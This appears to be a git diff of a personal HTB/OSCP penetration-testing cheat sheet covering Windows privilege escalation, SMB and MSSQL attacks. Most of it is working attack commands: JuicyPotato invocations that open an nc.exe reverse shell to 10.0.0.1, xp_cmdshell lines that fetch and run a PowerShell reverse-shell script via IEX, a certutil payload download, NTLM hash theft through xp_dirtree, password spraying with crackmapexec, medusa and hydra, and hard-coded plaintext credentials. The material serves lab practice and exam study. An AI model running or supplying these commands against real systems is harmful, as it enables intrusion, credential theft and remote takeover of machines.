@@ -1,10 +1,10 @@
-# Useful Commands for HTB/OSCP 
+# Useful Commands for HTB/OSCP
 > **Website**: https://IslandDog.ky
 > **Last Update**: 06/25/21
 
 ## RustScan - #rustscan 
 ```bash
-sudo rustscan --ulimit 5000 ${PWD##*/} -- -A -sC -sV --script 'default,vuln' -oX scan && xsltproc scan -o scan.html && rm -rf nikto-scan
+rustscan -u 5000 -a ${PWD##*/} -- -A -sC -sV --script 'default,vuln' -oX scan && xsltproc scan -o scan.html && rm -rf scanfire
 ```
 
 ## Reverse Shell #OneLiners
@@ -111,9 +111,23 @@ apt update hooking (PreInvoke)
 ```
 
 ## PrivEsc Windows 
-CHECK FOR ACTIVE CVEs
+
+#### CHECK FOR ACTIVE CVEs
+```bash
+whoami /all
+sysinfo
+```
 #SeImpersonate #SeAssignPrimaryToken
-SeImpersonate/SeAssignPrimaryToken - If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.
+#JuicyPotato #RottenPotato #LonelyPotato #HotPotato #RoguePotato #PrintSpoofter
+SeImpersonate/SeAssignPrimaryToken - If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are ```SYSTEM```. Review the different Potatoes.
+
+If the machine is -
+> Windows 10 1809 & Windows Server 2019 - Rogue Potato.
+> Windows 10 1809 < Windows Server 2019 - Juicy Potato.
+> Windows Server 2019 - PrintSpoofer
+
+https://github.com/itm4n/PrintSpoofer
+
 ```powershell
 JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe 10.0.0.1 1234 -e c:\windows\system32\cmd.exe" -t *
 JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe 10.0.0.1 1234 -e c:\windows\system32\cmd.exe" -t * -c <CLSID>
@@ -265,21 +279,28 @@ retr 1
 rpcinfo -p ${PWD##*/}
 ```
 
-### 139/445 - ```smb://[putinip]/``` (File Manager) #SMB 
+### 139/445 - ```smb://[putinip]/```#SMB 
+#smbclient - Start here
 ```bash
-CME - Run as Root
-cme smb ${PWD##*/} -u '' -p '' --shares
-cme smb ${PWD##*/} -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares
-cme smb ${PWD##*/} -u users.txt -p passwords.txt --shares --continue-on-success
-medusa -h ${PWD##*/} -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
-smbclient -L \\\\[ip]
 smbclient -N -L ${PWD##*/}
-winexe -U username //${PWD##*/} "cmd.exe" --system
-mount -t cifs '//${PWD##*/}/new-site' smb -v -o user=tyler
-umount smb
+smbclient -L \\\\[ip]
 smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //${PWD##*/}/new-site -c 'put nc.exe nc.exe'
 smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\${PWD##*/}\\c$
 ```
+#crackmapexec #password_spray
+```bash
+crackmapexec smb ${PWD##*/} -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares
+crackmapexec smb ${PWD##*/} -u users.txt -p passwords.txt --shares --continue-on-success
+medusa -h ${PWD##*/} -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
+winexe -U username //${PWD##*/} "cmd.exe" --system
+```
+
+#mounting-shares
+```bash
+mount -t cifs '//${PWD##*/}/new-site' smb -v -o user=tyler
+umount smb
+```
+
 #SMB - Shells via Impacket
 ```bash
 psexec.py <DOMAIN>/<USER>:<PASSWORD>@${PWD##*/}
@@ -313,11 +334,17 @@ ldapsearch -h ${PWD##*/} -x -s sub -b "DC=megacorp,DC=local" |tee ldap.out && ca
 ```
 
 ### 1433 #MSSQL
+
+Enumeration
 ```bash
 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 ${PWD##*/}
-hydra -L users -P passwords ${PWD##*/} mssql -vV -I -u
+```
+
+Login #Impacket and Cracking #hydra -
+```bash
 mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@${PWD##*/}
 mssqlclient.py <USER>:<PASSWORD>@${PWD##*/}
+hydra -L users -P passwords ${PWD##*/} mssql -vV -I -u
 ```
 
 Once logged in you can run queries:
@@ -325,18 +352,18 @@ Once logged in you can run queries:
 SQL> select @@ version;
 ```
 
-Steal NTLM hash -
-```sql
-sudo smbserver.py -smb2support smb .
-SQL> exec master..xp_dirtree '\\10.0.0.1\smb\' # Steal the NTLM hash, crack it with john or hashcat
-```
-
-Try to enable code execution
+Try to enable code execution #xp_cmdshell -
 ```bash
 SQL> enable_xp_cmdshell
-#Execute code
 SQL> xp_cmdshell whoami /all
-SQL> xp_cmdshell certutil.exe -urlcache -split -f http://10.0.0.1/nc.exe
+SQL> xp_cmdshell "powershell -c IEX(New-Object System.Net.WebClient).DownloadString(\"http://10.0.0.1/www/webshells/Invoke-
+PowerShellTcp.ps1\")
+```
+
+Steal the ```NTLM``` hash with responder, crack it with ```john``` or ```hashcat``` -
+```sql
+sudo smbserver.py -smb2support smb .
+SQL> exec master..xp_dirtree '\\10.0.0.1\smb\'
 ```
 
 ### 1521 #Oracle
